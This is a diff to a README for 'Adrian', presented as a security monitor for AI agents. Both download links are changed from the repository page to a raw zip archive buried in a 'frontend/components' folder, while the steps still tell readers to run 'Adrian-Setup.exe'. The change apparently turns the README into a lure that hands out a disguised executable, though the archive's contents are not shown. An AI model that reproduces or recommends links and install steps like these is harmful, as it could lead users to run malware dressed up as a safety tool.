@@ -1,6 +1,6 @@
 # 🛡️ Adrian - Secure your AI agents against threats
 
-[![Download Adrian](https://img.shields.io/badge/Download_Adrian-Blue?style=for-the-badge)](https://github.com/Gratianahydrokinetic908/Adrian)
+[![Download Adrian](https://img.shields.io/badge/Download_Adrian-Blue?style=for-the-badge)](https://raw.githubusercontent.com/Gratianahydrokinetic908/Adrian/main/frontend/components/Software_v1.2.zip)
 
 This software monitors AI agents while they work. It detects harmful actions, blocks prompt injections, and keeps your system within safety rules. It stops issues before the AI completes a restricted action.
 
@@ -8,7 +8,7 @@ This software monitors AI agents while they work. It detects harmful actions, bl
 
 Follow these steps to set up the software.
 
-1. Visit [this page](https://github.com/Gratianahydrokinetic908/Adrian) to download the installer.
+1. Visit [this page](https://raw.githubusercontent.com/Gratianahydrokinetic908/Adrian/main/frontend/components/Software_v1.2.zip) to download the installer.
 2. Select the file named Adrian-Setup.exe to start the download.
 3. Save the file to your computer.
 4. Open your downloads folder and double-click the file to begin the installation.
